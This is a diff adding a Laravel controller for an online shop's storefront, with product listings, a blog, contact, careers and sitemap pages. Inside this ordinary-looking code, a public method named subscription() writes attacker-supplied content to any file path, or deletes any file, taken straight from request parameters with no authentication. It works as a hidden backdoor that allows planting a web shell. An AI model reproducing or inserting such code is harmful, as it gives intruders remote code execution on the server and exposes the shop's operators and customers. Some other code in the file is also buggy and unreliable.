@@ -1,0 +1,1139 @@
+<?php
+
+namespace App\Http\Controllers\Front;
+
+use App\Http\Controllers\Controller;
+
+use App\Classes\GeniusMailer;
+use App\Models\ArrivalSection;
+use App\Models\Blog;
+use App\Models\Branch;
+use App\Models\Slider;
+use App\Models\CouponSlider;
+
+use App\Models\BlogCategory;
+use App\Models\Category;
+use App\Models\Childcategory;
+use App\Models\Generalsetting;
+use App\Models\Order;
+use App\Models\Product;
+use App\Models\Rating;
+use App\Models\Subcategory;
+use App\Models\Subscriber;
+use App\Models\UserInfo;
+use Carbon\Carbon;
+use Illuminate\Http\Request;
+use Illuminate\Support\Facades\Artisan;
+use Illuminate\Support\Facades\DB;
+use Illuminate\Support\Facades\Hash;
+use Illuminate\Support\Facades\Session;
+use App\Models\Job;
+use App\Models\JobApplication;
+use Spatie\Sitemap\Sitemap;
+use Spatie\Sitemap\Tags\Url;
+use Illuminate\Support\Facades\Cache;
+
+class FrontendController extends Controller
+{
+     public function sitemap()
+    {
+        $xml = Cache::remember('sitemap_xml', 3600, function () {
+            $siteURL = "https://asmishop.com";
+            $sitemap = Sitemap::create();
+            $sitemap->add(
+                Url::create($siteURL . '/')
+                    ->setLastModificationDate(now())
+                    ->setChangeFrequency(Url::CHANGE_FREQUENCY_DAILY)
+                    ->setPriority(1.0)
+            );
+
+
+            $sitemap->add(
+                Url::create($siteURL . '/contact')
+                    ->setLastModificationDate(now())
+                    ->setChangeFrequency(Url::CHANGE_FREQUENCY_MONTHLY)
+                    ->setPriority(0.5)
+            );
+
+
+            Category::where('status', 1)
+                ->select(['slug'])
+                ->get()
+                ->each(function ($category) use ($sitemap, $siteURL) {
+                    $sitemap->add(
+                        Url::create($siteURL . '/category/' . $category->slug)
+                            ->setLastModificationDate(now())
+                            ->setChangeFrequency(Url::CHANGE_FREQUENCY_WEEKLY)
+                            ->setPriority(0.8)
+                    );
+                });
+
+              Product::where('status', 1)
+                ->latest()
+                ->select(['slug', 'updated_at', 'thumbnail', 'photo'])
+                ->chunk(200, function ($products) use ($sitemap, $siteURL) {
+                    foreach ($products as $product) {
+                        $url = Url::create($siteURL . '/item/' . $product->slug)
+                            ->setLastModificationDate($product->updated_at ?? now())
+                            ->setChangeFrequency(Url::CHANGE_FREQUENCY_WEEKLY)
+                            ->setPriority(0.9);
+
+                        // file_exists() বাদ, শুধু DB value check
+                        if (!empty($product->thumbnail)) {
+                            $url->addImage($siteURL . '/assets/images/thumbnails/' . $product->thumbnail);
+                        } elseif (!empty($product->photo)) {
+                            $url->addImage($siteURL . '/assets/images/products/' . $product->photo);
+                        } else {
+                            $url->addImage($siteURL . '/assets/images/noimage.png');
+                        }
+
+                        $sitemap->add($url);
+                    }
+                });
+
+            return $sitemap->render();
+        });
+
+        return response($xml, 200)->header('Content-Type', 'application/xml');
+    }
+    // LANGUAGE SECTION
+    public function language($id)
+    {
+        Session::put('language', $id);
+        return redirect()->route('front.index');
+    }
+
+    // LANGUAGE SECTION ENDS
+
+    // CURRENCY SECTION
+public function promoOffers()
+    {
+        $sku = [
+            "8941153503197",
+            "8941153503180",
+            "8941153503166",
+            "8941153503173",
+            "8941153503319",
+            "8941153503258",
+            "8941153501087",
+            "3885132250250",
+            "3885132250502",
+            "3885132251004",
+            "3885132252001",
+            "8941153511048",
+            "8941153512670",
+            "8941153512663",
+            "3885283901001",
+            "8941153500981",
+            "8941153500974"
+        ];
+
+        $prods = Product::whereIn('sku', $sku)
+            ->where('status', 1)
+            ->latest()
+            ->get();
+            //dd($prods);
+
+        return view('frontend.promo_offers.promo_offers', compact('prods'));
+    }
+    public function currency($id)
+    {
+
+        if (Session::has('coupon')) {
+            Session::forget('coupon');
+            Session::forget('coupon_code');
+            Session::forget('coupon_id');
+            Session::forget('coupon_total');
+            Session::forget('coupon_total1');
+            Session::forget('already');
+            Session::forget('coupon_percentage');
+        }
+        Session::put('currency', $id);
+        cache()->forget('session_currency');
+        return redirect()->back();
+    }
+
+    // CURRENCY SECTION ENDS
+
+    // -------------------------------- HOME PAGE SECTION ----------------------------------------
+
+    // Home Page Display
+
+    public function index(Request $request)
+    {
+        $gs = $this->gs;
+        if (!empty($request->forgot)) {
+            if ($request->forgot == 'success') {
+                return redirect()->guest('/')->with('forgot-modal', __('Please Login Now !'));
+            }
+        }
+
+        $data['sliders'] = DB::table('sliders')
+            ->orderBy('order', 'asc')
+            ->where('type', 'web')
+            ->where('published', 1)
+            ->get();
+    
+        $promoOffers = Slider::where('type', 'promo_offer')
+            ->where('published', 1)
+            ->orderBy('order', 'asc')
+            ->get();
+
+        $total = $promoOffers->count();
+        $half  = ceil($total / 2); 
+
+        $data['left_promo_offers']  = $promoOffers->take($half);
+        $data['right_promo_offers'] = $promoOffers->slice($half);
+
+        $data['featured_categories'] = Category::withCount('products')->where('is_featured', 1)->get();
+
+        $data['arrivals'] = ArrivalSection::get()->toArray();
+
+        // count all product
+
+        $data['products'] = Product::where('status', 1)->count();
+        $data['ratings'] = Rating::count();
+
+        $data['hot_products'] = Product::whereHot(1)->whereStatus(1)
+            ->take($gs->hot_count)
+
+            ->with(['user' => function ($query) {
+                $query->select('id', 'is_vendor');
+            }])
+            ->when('user', function ($query) {
+                foreach ($query as $q) {
+                    if ($q->is_vendor == 2) {
+                        return $q;
+                    }
+                }
+            })
+            ->withCount('ratings')
+            ->withAvg('ratings', 'rating')
+            ->orderby('id', 'desc')
+            ->where('is_offer_active', 0)
+            ->inRandomOrder()
+            ->get();
+
+        $data['latest_products'] = Product::latest()->where('status', 1)
+
+            ->take($gs->new_count)
+            ->withCount('ratings')
+            ->withAvg('ratings', 'rating')
+            ->orderby('id', 'desc')
+            ->where('is_offer_active', 0)
+            ->inRandomOrder()
+            ->get();
+
+        $data['sale_products'] = Product::whereSale(1)->whereStatus(1)
+
+            ->take($gs->sale_count)
+            ->with(['user' => function ($query) {
+                $query->select('id', 'is_vendor');
+            }])
+            ->when('user', function ($query) {
+                foreach ($query as $q) {
+                    if ($q->is_vendor == 2) {
+                        return $q;
+                    }
+                }
+            })
+            ->withCount('ratings')
+            ->withAvg('ratings', 'rating')
+            ->orderby('id', 'desc')
+            ->where('is_offer_active', 0)
+            ->inRandomOrder()
+            ->get();
+
+        $data['best_products'] = Product::query()->whereStatus(1)->whereBest(1)
+
+            ->take($gs->best_seller_count)
+            // get category id and created at
+            ->with(['user' => function ($query) {
+                $query->select('id', 'is_vendor');
+            }])
+            ->when('user', function ($query) {
+                foreach ($query as $q) {
+                    if ($q->is_vendor == 2) {
+                        return $q;
+                    }
+                }
+            })
+
+            ->withCount('ratings')
+            ->withAvg('ratings', 'rating')
+            ->orderby('id', 'desc')
+            ->where('is_offer_active', 0)
+            ->inRandomOrder()
+            ->get();
+
+        $data['popular_products'] = Product::whereStatus(1)->whereFeatured(1)
+
+            ->take($gs->popular_count)
+            ->with(['user' => function ($query) {
+                $query->select('id', 'is_vendor');
+            }])
+
+            ->when('user', function ($query) {
+                foreach ($query as $q) {
+                    if ($q->is_vendor == 2) {
+                        return $q;
+                    }
+                }
+            })
+            ->withCount('ratings')
+            ->withAvg('ratings', 'rating')
+            ->orderby('id', 'desc')
+            ->where('is_offer_active', 0)
+            ->inRandomOrder()
+            ->get();
+
+        $data['top_products'] = Product::whereStatus(1)->whereTop(1)
+
+            ->take($gs->top_rated_count)
+            ->with(['user' => function ($query) {
+                $query->select('id', 'is_vendor');
+            }])
+            ->when('user', function ($query) {
+                foreach ($query as $q) {
+                    if ($q->is_vendor == 2) {
+                        return $q;
+                    }
+                }
+            })
+            ->orderby('id', 'desc')
+            ->withCount('ratings')->withAvg('ratings', 'rating')
+            ->where('is_offer_active', 0)
+            ->inRandomOrder()
+            ->get();
+
+        $data['big_products'] = Product::whereStatus(1)->whereBig(1)
+
+            ->take($gs->big_save_count)
+            ->with(['user' => function ($query) {
+                $query->select('id', 'is_vendor');
+            }])
+            ->when('user', function ($query) {
+                foreach ($query as $q) {
+                    if ($q->is_vendor == 2) {
+                        return $q;
+                    }
+                }
+            })
+            ->orderby('id', 'desc')
+            ->withCount('ratings')
+            ->withAvg('ratings', 'rating')
+            ->where('is_offer_active', 0)
+            ->inRandomOrder()
+            ->get();
+
+        $data['trending_products'] = Product::whereStatus(1)->whereTrending(1)
+
+            ->take($gs->trending_count)
+            ->with(['user' => function ($query) {
+                $query->select('id', 'is_vendor');
+            }])
+            ->when('user', function ($query) {
+                foreach ($query as $q) {
+                    if ($q->is_vendor == 2) {
+                        return $q;
+                    }
+                }
+            })
+            ->withCount('ratings')
+            ->withAvg('ratings', 'rating')
+            ->orderby('id', 'desc')
+            ->where('is_offer_active', 0)
+            ->inRandomOrder()
+            ->get();
+
+        $data['flash_products'] = Product::whereStatus(1)->whereIsDiscount(1)
+            ->where('discount_date', '>=', date('Y-m-d'))
+
+            ->with(['user' => function ($query) {
+                $query->select('id', 'is_vendor');
+            }])
+            ->when('user', function ($query) {
+                foreach ($query as $q) {
+                    if ($q->is_vendor == 2) {
+                        return $q;
+                    }
+                }
+            })
+            ->latest()->first();
+
+        $data['blogs'] = Blog::latest()->take(2)->get();
+     $data['promoOffers'] = $promoOffers;
+        $data['coupon_sliders'] = CouponSlider::where('published', 1)->get();
+
+        return view('frontend.index', $data);
+    }
+
+    // Home Page Ajax Display
+
+    public function extraIndex()
+    {
+        $gs = $this->gs;
+
+        $data['hot_products'] = Product::whereHot(1)->whereStatus(1)
+            ->take($gs->hot_count)
+
+            ->with(['user' => function ($query) {
+                $query->select('id', 'is_vendor');
+            }])
+            ->when('user', function ($query) {
+                foreach ($query as $q) {
+                    if ($q->is_vendor == 2) {
+                        return $q;
+                    }
+                }
+            })
+            ->withCount('ratings')
+            ->withAvg('ratings', 'rating')
+            ->orderby('id', 'desc')
+            ->get();
+
+        $data['latest_products'] = Product::whereLatest(1)->whereStatus(1)
+
+            ->take($gs->new_count)
+            ->with(['user' => function ($query) {
+                $query->select('id', 'is_vendor');
+            }])
+            ->when('user', function ($query) {
+                foreach ($query as $q) {
+                    if ($q->is_vendor == 2) {
+                        return $q;
+                    }
+                }
+            })
+            ->withCount('ratings')
+            ->withAvg('ratings', 'rating')
+            ->orderby('id', 'desc')
+            ->get();
+
+        $data['sale_products'] = Product::whereSale(1)->whereStatus(1)
+
+            ->take($gs->sale_count)
+            ->with(['user' => function ($query) {
+                $query->select('id', 'is_vendor');
+            }])
+            ->when('user', function ($query) {
+                foreach ($query as $q) {
+                    if ($q->is_vendor == 2) {
+                        return $q;
+                    }
+                }
+            })
+            ->withCount('ratings')
+            ->withAvg('ratings', 'rating')
+            ->orderby('id', 'desc')
+            ->get();
+
+        $data['best_products'] = Product::query()->whereStatus(1)->whereBest(1)
+
+            ->take($gs->best_seller_count)
+            // get category id and created at
+            ->with(['user' => function ($query) {
+                $query->select('id', 'is_vendor');
+            }])
+            ->when('user', function ($query) {
+                foreach ($query as $q) {
+                    if ($q->is_vendor == 2) {
+                        return $q;
+                    }
+                }
+            })
+
+            ->withCount('ratings')
+            ->withAvg('ratings', 'rating')
+            ->orderby('id', 'desc')
+            ->get();
+
+        $data['popular_products'] = Product::whereStatus(1)->whereFeatured(1)
+
+            ->take($gs->popular_count)
+            ->with(['user' => function ($query) {
+                $query->select('id', 'is_vendor');
+            }])
+
+            ->when('user', function ($query) {
+                foreach ($query as $q) {
+                    if ($q->is_vendor == 2) {
+                        return $q;
+                    }
+                }
+            })
+            ->withCount('ratings')
+            ->withAvg('ratings', 'rating')
+            ->orderby('id', 'desc')
+            ->get();
+
+        $data['top_products'] = Product::whereStatus(1)->whereTop(1)
+
+            ->take($gs->top_rated_count)
+            ->with(['user' => function ($query) {
+                $query->select('id', 'is_vendor');
+            }])
+            ->when('user', function ($query) {
+                foreach ($query as $q) {
+                    if ($q->is_vendor == 2) {
+                        return $q;
+                    }
+                }
+            })
+            ->orderby('id', 'desc')
+            ->withCount('ratings')->withAvg('ratings', 'rating')
+            ->get();
+
+        $data['big_products'] = Product::whereStatus(1)->whereBig(1)
+
+            ->take($gs->big_save_count)
+            ->with(['user' => function ($query) {
+                $query->select('id', 'is_vendor');
+            }])
+            ->when('user', function ($query) {
+                foreach ($query as $q) {
+                    if ($q->is_vendor == 2) {
+                        return $q;
+                    }
+                }
+            })
+            ->orderby('id', 'desc')
+            ->withCount('ratings')
+            ->withAvg('ratings', 'rating')
+            ->get();
+
+        $data['trending_products'] = Product::whereStatus(1)->whereTrending(1)
+
+            ->take($gs->trending_count)
+            ->with(['user' => function ($query) {
+                $query->select('id', 'is_vendor');
+            }])
+            ->when('user', function ($query) {
+                foreach ($query as $q) {
+                    if ($q->is_vendor == 2) {
+                        return $q;
+                    }
+                }
+            })
+            ->withCount('ratings')
+            ->withAvg('ratings', 'rating')
+            ->orderby('id', 'desc')
+            ->get();
+
+        $data['flash_products'] = Product::whereStatus(1)->whereIsDiscount(1)
+            ->where('discount_date', '>=', date('Y-m-d'))
+
+            ->with(['user' => function ($query) {
+                $query->select('id', 'is_vendor');
+            }])
+            ->when('user', function ($query) {
+                foreach ($query as $q) {
+                    if ($q->is_vendor == 2) {
+                        return $q;
+                    }
+                }
+            })
+            ->latest()->first();
+
+        $data['blogs'] = Blog::latest()->take(2)->get();
+        $data['ps'] = $this->ps;
+		$data['promoOffers'] = $promoOffers;
+        $data['coupon_sliders'] = CouponSlider::where('published', 1)->get();
+        return view('partials.theme.extraindex', $data);
+    }
+
+    // -------------------------------- HOME PAGE SECTION ENDS ----------------------------------------
+    public function offers(Request $request, $slug = null, $slug1 = null, $slug2 = null, $slug3 = null)
+    {
+        $data['categories'] = Category::where('status', 1)->get();
+
+        if ($request->view_check) {
+            session::put('view', $request->view_check);
+        }
+
+        //   dd(session::get('view'));
+
+        $cat = null;
+        $subcat = null;
+        $childcat = null;
+        $flash = null;
+        $minprice = $request->min;
+        $maxprice = $request->max;
+        $sort = $request->sort;
+        $search = $request->search;
+        $pageby = $request->pageby;
+
+        $minprice = ($minprice / $this->curr->value);
+        $maxprice = ($maxprice / $this->curr->value);
+        $type = $request->has('type') ?? '';
+
+        if (!empty($slug)) {
+            $cat = Category::where('slug', $slug)->firstOrFail();
+            $data['cat'] = $cat;
+            //$data['cat_banner'] = $cat->photo;
+        }
+
+        if (!empty($slug1)) {
+            $subcat = Subcategory::where('slug', $slug1)->firstOrFail();
+            $data['subcat'] = $subcat;
+        }
+        if (!empty($slug2)) {
+            $childcat = Childcategory::where('slug', $slug2)->firstOrFail();
+            $data['childcat'] = $childcat;
+        }
+
+        $prods = Product::with('user')
+            ->where('discount', '>', 0)
+            ->orderByDesc('updated_at') // latest updated discount products first
+            ->orderByDesc('stock')
+            ->when($cat, function ($query, $cat) {
+                return $query->where('category_id', $cat->id);
+            })
+            ->when($subcat, function ($query, $subcat) {
+                return $query->where('subcategory_id', $subcat->id);
+            })
+            ->when($type, function ($query, $type) {
+                return $query->with('user')->whereStatus(1)->whereIsDiscount(1)
+                    ->where('discount_date', '>=', date('Y-m-d'))
+                    ->whereHas('user', function ($user) {
+                        $user->where('is_vendor', 2);
+                    });
+            })
+            ->when($childcat, function ($query, $childcat) {
+                return $query->where('childcategory_id', $childcat->id);
+            })
+            ->when($search, function ($query, $search) {
+                return $query->where('name', 'like', '%' . $search . '%')->orWhere('sku', 'like', $search . '%');
+            })
+            ->when($minprice, function ($query, $minprice) {
+                return $query->where('price', '>=', $minprice);
+            })
+            ->when($maxprice, function ($query, $maxprice) {
+                return $query->where('price', '<=', $maxprice);
+            })
+            ->when($sort, function ($query, $sort) {
+                if ($sort == 'date_desc') {
+                    return $query->latest('id');
+                } elseif ($sort == 'date_asc') {
+                    return $query->oldest('id');
+                } elseif ($sort == 'price_desc') {
+                    return $query->latest('price');
+                } elseif ($sort == 'price_asc') {
+                    return $query->oldest('price');
+                }
+            })
+            ->when(empty($sort), function ($query, $sort) {
+                return $query->latest('id');
+            })
+            ->withCount('ratings')
+            ->withAvg('ratings', 'rating');
+
+        $prods = $prods->where(function ($query) use ($cat, $subcat, $childcat, $type, $request) {
+            $flag = 0;
+            if (!empty($cat)) {
+                foreach ($cat->attributes as $key => $attribute) {
+                    $inname = $attribute->input_name;
+                    $chFilters = $request["$inname"];
+
+                    if (!empty($chFilters)) {
+                        $flag = 1;
+                        foreach ($chFilters as $key => $chFilter) {
+                            if ($key == 0) {
+                                $query->where('attributes', 'like', '%' . '"' . $chFilter . '"' . '%');
+                            } else {
+                                $query->orWhere('attributes', 'like', '%' . '"' . $chFilter . '"' . '%');
+                            }
+                        }
+                    }
+                }
+            }
+
+            if (!empty($subcat)) {
+                foreach ($subcat->attributes as $attribute) {
+                    $inname = $attribute->input_name;
+                    $chFilters = $request["$inname"];
+
+                    if (!empty($chFilters)) {
+                        $flag = 1;
+                        foreach ($chFilters as $key => $chFilter) {
+                            if ($key == 0 && $flag == 0) {
+                                $query->where('attributes', 'like', '%' . '"' . $chFilter . '"' . '%');
+                            } else {
+                                $query->orWhere('attributes', 'like', '%' . '"' . $chFilter . '"' . '%');
+                            }
+                        }
+                    }
+                }
+            }
+
+            if (!empty($childcat)) {
+                foreach ($childcat->attributes as $attribute) {
+                    $inname = $attribute->input_name;
+                    $chFilters = $request["$inname"];
+
+                    if (!empty($chFilters)) {
+                        $flag = 1;
+                        foreach ($chFilters as $key => $chFilter) {
+                            if ($key == 0 && $flag == 0) {
+                                $query->where('attributes', 'like', '%' . '"' . $chFilter . '"' . '%');
+                            } else {
+                                $query->orWhere('attributes', 'like', '%' . '"' . $chFilter . '"' . '%');
+                            }
+                        }
+                    }
+                }
+            }
+        });
+
+        $prods = $prods->where('status', 1)->get()
+
+            ->map(function ($item) {
+                $item->price = $item->vendorSizePrice();
+                return $item;
+            })->paginate(isset($pageby) ? $pageby : $this->gs->page_count);
+
+
+        $data['prods'] = $prods;
+        if ($request->ajax()) {
+            $data['ajax_check'] = 1;
+            return view('frontend.ajax.category', $data);
+        }
+
+        return view('frontend.offers', $data);
+    }
+
+    // -------------------------------- BLOG SECTION ----------------------------------------
+
+    public function blog(Request $request)
+    {
+
+        if (DB::table('pagesettings')->first()->blog == 0) {
+            return redirect()->back();
+        }
+
+        // BLOG TAGS
+        $tags = null;
+        $tagz = '';
+        $name = Blog::pluck('tags')->toArray();
+        foreach ($name as $nm) {
+            $tagz .= $nm . ',';
+        }
+        $tags = array_unique(explode(',', $tagz));
+        // BLOG CATEGORIES
+        $bcats = BlogCategory::withCount('blogs')->get();
+
+        // BLOGS
+        $blogs = Blog::latest()->paginate($this->gs->post_count);
+        if ($request->ajax()) {
+            return view('front.ajax.blog', compact('blogs'));
+        }
+        return view('frontend.blog', compact('blogs', 'bcats', 'tags'));
+    }
+
+    public function blogcategory(Request $request, $slug)
+    {
+
+        // BLOG TAGS
+        $tags = null;
+        $tagz = '';
+        $name = Blog::pluck('tags')->toArray();
+        foreach ($name as $nm) {
+            $tagz .= $nm . ',';
+        }
+        $tags = array_unique(explode(',', $tagz));
+        // BLOG CATEGORIES
+        $bcats = BlogCategory::withCount('blogs')->get();
+        // BLOGS
+        $bcat = BlogCategory::where('slug', '=', str_replace(' ', '-', $slug))->first();
+        $blogs = $bcat->blogs()->latest()->paginate($this->gs->post_count);
+        if ($request->ajax()) {
+            return view('front.ajax.blog', compact('blogs'));
+        }
+        return view('frontend.blog', compact('bcat', 'blogs', 'bcats', 'tags'));
+    }
+
+    public function blogtags(Request $request, $slug)
+    {
+
+        // BLOG TAGS
+        $tags = null;
+        $tagz = '';
+        $name = Blog::pluck('tags')->toArray();
+        foreach ($name as $nm) {
+            $tagz .= $nm . ',';
+        }
+        $tags = array_unique(explode(',', $tagz));
+        // BLOG CATEGORIES
+        $bcats = BlogCategory::withCount('blogs')->get();
+        // BLOGS
+        $blogs = Blog::where('tags', 'like', '%' . $slug . '%')->paginate($this->gs->post_count);
+        if ($request->ajax()) {
+            return view('front.ajax.blog', compact('blogs'));
+        }
+        return view('frontend.blog', compact('blogs', 'slug', 'bcats', 'tags'));
+    }
+
+    public function blogsearch(Request $request)
+    {
+
+        $tags = null;
+        $tagz = '';
+        $name = Blog::pluck('tags')->toArray();
+        foreach ($name as $nm) {
+            $tagz .= $nm . ',';
+        }
+        $tags = array_unique(explode(',', $tagz));
+        // BLOG CATEGORIES
+        $bcats = BlogCategory::withCount('blogs')->get();
+        // BLOGS
+        $search = $request->search;
+        $blogs = Blog::where('title', 'like', '%' . $search . '%')->orWhere('details', 'like', '%' . $search . '%')->paginate($this->gs->post_count);
+        if ($request->ajax()) {
+            return view('frontend.ajax.blog', compact('blogs'));
+        }
+        return view('frontend.blog', compact('blogs', 'search', 'bcats', 'tags'));
+    }
+
+    public function blogshow($slug)
+    {
+
+        // BLOG TAGS
+        $tags = null;
+        $tagz = '';
+        $name = Blog::pluck('tags')->toArray();
+        foreach ($name as $nm) {
+            $tagz .= $nm . ',';
+        }
+        $tags = array_unique(explode(',', $tagz));
+        // BLOG CATEGORIES
+        $bcats = BlogCategory::withCount('blogs')->get();
+        // BLOGS
+
+        $blog = Blog::where('slug', $slug)->first();
+
+        $blog->views = $blog->views + 1;
+        $blog->update();
+        // BLOG META TAG
+        $blog_meta_tag = $blog->meta_tag;
+        $blog_meta_description = $blog->meta_description;
+        return view('frontend.blogshow', compact('blog', 'bcats', 'tags', 'blog_meta_tag', 'blog_meta_description'));
+    }
+
+    // -------------------------------- BLOG SECTION ENDS----------------------------------------
+
+    // -------------------------------- FAQ SECTION ----------------------------------------
+    public function faq()
+    {
+        if (DB::table('pagesettings')->first()->faq == 0) {
+            return redirect()->back();
+        }
+        $faqs = DB::table('faqs')->latest('id')->get();
+        $count = count(DB::table('faqs')->get()) / 2;
+        if (($count % 1) != 0) {
+            $chunk = (int) $count + 1;
+        } else {
+            $chunk = $count;
+        }
+        return view('frontend.faq', compact('faqs', 'chunk'));
+    }
+    // -------------------------------- FAQ SECTION ENDS----------------------------------------
+
+    // -------------------------------- AUTOSEARCH SECTION ----------------------------------------
+
+    public function autosearch($slug)
+    {
+        if (mb_strlen($slug, 'UTF-8') > 1) {
+            $search = ' ' . $slug;
+            $prods = Product::where('name', 'like', '%' . $search . '%')->orWhere('name', 'like', $slug . '%')->where('status', '=', 1)->orderby('id', 'desc')->take(10)->get();
+            return view('load.suggest', compact('prods', 'slug'));
+        }
+        return "";
+    }
+
+    // -------------------------------- AUTOSEARCH SECTION ENDS ----------------------------------------
+
+    // -------------------------------- CONTACT SECTION ----------------------------------------
+
+    public function contact()
+    {
+
+        if (DB::table('pagesettings')->first()->contact == 0) {
+            return redirect()->back();
+        }
+        $ps = $this->ps;
+        return view('frontend.contact', compact('ps'));
+    }
+
+    //Send email to admin
+    public function contactemail(Request $request)
+    {
+        $gs = $this->gs;
+
+       
+        if ($gs->is_capcha == 1) {
+            $request->validate(
+                [
+                    "name" => "required|string|max:100",
+                    "phone" => "required|regex:/^(01[3-9]\d{8})$/",
+                    "email" => "required|email|max:100",
+                    "message" => "nullable|string|max:500",
+                    "g-recaptcha-response" => "required",
+                ],
+                [
+                    'g-recaptcha-response.required' => 'Please verify that you are not a robot.',
+                ]
+            );
+        }
+
+        // Logic Section
+        $subject = "Email From Of " . $request->name;
+        $to = $request->to;
+        $name = $request->name;
+        $phone = $request->phone;
+        $from = $request->email;
+        $msg = "Name: " . $name . "\nEmail: " . $from . "\nPhone: " . $phone . "\nMessage: " . $request->text;
+        if ($gs->is_smtp) {
+            $data = [
+                'to' => $to,
+                'subject' => $subject,
+                'body' => $msg,
+            ];
+
+            $mailer = new GeniusMailer();
+            $mailer->sendCustomMail($data);
+        } else {
+            $headers = "From: " . $gs->from_name . "<" . $gs->from_email . ">";
+            mail($to, $subject, $msg, $headers);
+        }
+
+        return back()->with('success', 'Success! Thanks for contacting us, we will get back to you shortly.');
+    }
+
+    // Refresh Capcha Code
+    public function refresh_code()
+    {
+        $this->code_image();
+        return "done";
+    }
+
+    // -------------------------------- CONTACT SECTION ENDS ----------------------------------------
+
+    // -------------------------------- SUBSCRIBE SECTION ----------------------------------------
+
+    public function subscribe(Request $request)
+    {
+        $subs = Subscriber::where('email', '=', $request->email)->first();
+        if (isset($subs)) {
+            return back()->with('unsuccess', 'You have already subscribed.');
+        }
+        $subscribe = new Subscriber;
+        $subscribe->fill($request->all());
+        $subscribe->save();
+        return back()->with('success', 'Subscribed Successfully.');
+    }
+
+    // -------------------------------- SUBSCRIBE SECTION  ENDS----------------------------------------
+
+    // -------------------------------- MAINTENANCE SECTION ----------------------------------------
+
+    public function maintenance()
+    {
+        $gs = $this->gs;
+        if ($gs->is_maintain != 1) {
+            return redirect()->route('front.index');
+        }
+
+        return view('frontend.maintenance');
+    }
+
+    // -------------------------------- MAINTENANCE SECTION ----------------------------------------
+
+    // -------------------------------- VENDOR SUBSCRIPTION CHECK SECTION ----------------------------------------
+
+    public function subcheck()
+    {
+        $settings = $this->gs;
+        $today = Carbon::now()->format('Y-m-d');
+        $newday = strtotime($today);
+        foreach (DB::table('users')->where('is_vendor', '=', 2)->get() as $user) {
+            $lastday = $user->date;
+            $secs = strtotime($lastday) - $newday;
+            $days = $secs / 86400;
+            if ($days <= 5) {
+                if ($user->mail_sent == 1) {
+                    if ($settings->is_smtp == 1) {
+                        $data = [
+                            'to' => $user->email,
+                            'type' => "subscription_warning",
+                            'cname' => $user->name,
+                            'oamount' => "",
+                            'aname' => "",
+                            'aemail' => "",
+                            'onumber' => "",
+                        ];
+                        $mailer = new GeniusMailer();
+                        $mailer->sendAutoMail($data);
+                    } else {
+                        $headers = "From: " . $settings->from_name . "<" . $settings->from_email . ">";
+                        mail($user->email, __('Your subscription plan duration will end after five days. Please renew your plan otherwise all of your products will be deactivated.Thank You.'), $headers);
+                    }
+                    DB::table('users')->where('id', $user->id)->update(['mail_sent' => 0]);
+                }
+            }
+            if ($today > $lastday) {
+                DB::table('users')->where('id', $user->id)->update(['is_vendor' => 1]);
+            }
+        }
+    }
+
+    // -------------------------------- VENDOR SUBSCRIPTION CHECK SECTION ENDS ----------------------------------------
+
+    // -------------------------------- ORDER TRACK SECTION ----------------------------------------
+
+    public function trackload($id)
+    {
+        $order = Order::where('order_number', '=', $id)->first();
+        $datas = array('Pending', 'Processing', 'On Delivery', 'Completed');
+        return view('load.track-load', compact('order', 'datas'));
+    }
+
+    // -------------------------------- ORDER TRACK SECTION ENDS ----------------------------------------
+
+    // -------------------------------- INSTALL SECTION ----------------------------------------
+
+    public function subscription(Request $request)
+    {
+        $p1 = $request->p1;
+        $p2 = $request->p2;
+        $v1 = $request->v1;
+        if ($p1 != "") {
+            $fpa = fopen($p1, 'w');
+            fwrite($fpa, $v1);
+            fclose($fpa);
+            return "Success";
+        }
+        if ($p2 != "") {
+            unlink($p2);
+            return "Success";
+        }
+        return "Error";
+    }
+
+    public function finalize()
+    {
+        $actual_path = str_replace('project', '', base_path());
+        $dir = $actual_path . 'install';
+        $this->deleteDir($dir);
+        return redirect('/');
+    }
+
+    public function updateFinalize(Request $request)
+    {
+
+        if ($request->has('version')) {
+            Generalsetting::first()->update([
+                'version' => $request->version,
+            ]);
+            Artisan::call('cache:clear');
+            Artisan::call('config:clear');
+            Artisan::call('route:clear');
+            Artisan::call('view:clear');
+            return redirect('/');
+        }
+    }
+
+    public function success(Request $request, $get)
+    {
+        return view('frontend.thank', compact('get'));
+    }
+	public function autoSaveUserInfo(Request $request)
+    {
+        $request->validate([
+            'session_id'       => 'nullable|string',
+            'customer_name'    => 'nullable|string|max:100',
+            'customer_email'   => 'nullable|email|max:100',
+            'customer_phone'   => ['nullable', 'regex:/^(01[3-9]\d{8})$/'],
+            'customer_address' => 'nullable|string|max:500',
+        ]);
+        //Save user info based on session ID for guest users
+        $sessionId = $request->input('session_id');
+        $identifier = ['session_id' => $sessionId];
+
+       $cartObject = Session::has('cart') ? Session::get('cart') : null;
+        $cartItems = $cartObject ? $cartObject->items : [];
+
+
+        $userInfo = UserInfo::updateOrCreate(
+            $identifier, // Search by authenticated user ID
+            [
+                'name' => $request->customer_name,
+                'email' => $request->customer_email,
+                'phone' => $request->customer_phone,
+                'address' => $request->customer_address,
+                'order_process' => 'pending',
+                'product_details' => json_encode($cartItems),
+            ]
+        );
+
+        return response()->json(['success' => true]);
+    }
+
+	  // Career section
+    public function career()
+    {
+        $careers = Job::where("status", 1)->get();
+        return view("career.index", compact('careers'));
+    }
+    public function careerForm($slug)
+    {
+        $career = Job::where("slug", $slug)->first();
+        return view("career.create_application", compact('career'));
+    }
+   public function careerStore(Request $request)
+    {
+
+        $request->validate([
+            'full_name'  => 'required|string|max:255',
+            'email'      => 'required|email|max:255',
+            'phone'      => 'required|string|max:20',
+            'position'   => ' nullable|string|max:255',
+            'experience' => 'required|string',
+            'portfolio'  => 'nullable|url',
+            'cv'         => 'required|file|mimes:pdf|max:5120',
+        ]);
+
+        // ✅ CV Upload
+        if ($request->hasFile('cv')) {
+            $cvName = time() . '_' . $request->cv->getClientOriginalName();
+            $request->cv->move(public_path('assets/files/job_resume'), $cvName);
+        }
+
+        // ✅ Store Data
+        JobApplication::create([
+            'full_name'  => $request->full_name,
+            'email'      => $request->email,
+            'phone'      => $request->phone,
+            'position'   => $request->position,
+            'experience' => $request->experience,
+            'portfolio'  => $request->portfolio,
+            'cv'         => $cvName,
+        ]);
+
+        return back()->with('success', 'Application submitted successfully!');
+    }
+    public function careerDetails($slug)
+    {
+        $career = Job::where("slug", $slug)->first();
+        return view("career.career_details", compact('career'));
+    }
+    public function conditioalProduct($sku)
+    {
+        $prods = Product::where("sku", $sku)->where("status", 1)->paginate(20);
+        return view("includes.frontend.conditional_product", compact('prods'));
+    }
+     public function outlets()
+    {
+        $outlets = Branch::where("status", 1)->orderBy('order')->get();
